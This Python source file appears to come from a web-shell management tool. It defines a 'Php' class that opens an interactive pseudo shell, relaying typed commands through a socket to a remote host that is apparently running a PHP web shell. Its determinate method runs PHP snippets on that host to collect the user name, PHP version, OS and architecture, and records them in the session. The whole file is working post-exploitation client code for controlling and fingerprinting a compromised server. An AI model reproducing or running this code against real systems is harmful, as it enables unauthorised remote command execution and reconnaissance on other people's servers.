from core.shell.base_shell import Base_shell
from core.utils.printer import *

class Php(Base_shell):
    
    def interactive(self):
        while True:
            command = input(f"({color_green('php')}):pseudo shell){self.host} > ")
            if not command:
                continue
            elif command == 'exit':
                break
            else:
                output = self.sock(command)
                print_info(output)

    def execute(self, cmd, raw=False):
        output = self.sock(cmd)
        if output == None:
                return("Maybe code is too long if you use GET param")
        return output
    
    def determinate(self):
        user = self.execute("""	if(is_callable('posix_getpwuid')&&is_callable('posix_geteuid')) {
					$u=@posix_getpwuid(@posix_geteuid());
					if($u){
						$u=$u['name'];
					} else {
						$u=getenv('username');
					}
					print($u);
				}""")
        self.session_update("user", user)
        version = self.execute("""
                $v='';
				if(function_exists('phpversion')) {
					$v=phpversion();
				} elseif(defined('PHP_VERSION')) {
					$v=PHP_VERSION;
				} elseif(defined('PHP_VERSION_ID')) {
					$v=PHP_VERSION_ID;
				}
				print($v);""")
        self.session_update("version", f"Php {version}")
        os = self.execute("print(@php_uname('s'));")
        self.session_update("os", os)
        platform = self.execute("printf(@php_uname('m'));")
        self.session_update("arch", platform)